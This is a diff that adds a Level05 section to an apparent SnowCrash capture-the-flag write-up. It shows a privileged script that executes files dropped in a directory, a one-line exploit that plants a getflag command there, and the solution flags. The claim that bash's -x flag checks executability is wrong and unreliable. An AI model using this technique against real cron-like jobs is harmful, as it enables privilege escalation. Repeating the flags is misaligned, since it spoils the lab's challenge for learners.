@@ -122,3 +122,32 @@ level04@SnowCrash:~$
 ```
 
 Flag: `ne2searoevaevoem4ov4ar8ap`
+
+## Level05:
+
+```bash
+level05@SnowCrash:~$ ls -l /usr/sbin/ | grep flag05
+-rwxr-x---+ 1 flag05  flag05      94 Mar  5  2016 openarenaserver
+level05@SnowCrash:~$
+```
+
+```bash
+level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
+#!/bin/sh
+
+for i in /opt/openarenaserver/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+done
+level05@SnowCrash:~$
+```
+
+Flag `-x` will check if the file is executable, in that case it will execute it.
+
+Exploit:
+
+```bash
+echo "getflag > /opt/openarenaserver/flag" > /opt/openarenaserver/exploit && chmod +x /opt/openarenaserver/exploit && while true; do cat /opt/openarenaserver/flag 2>/dev/null;done
+```
+
+Flag: `viuaaale9huek52boumoomioc`
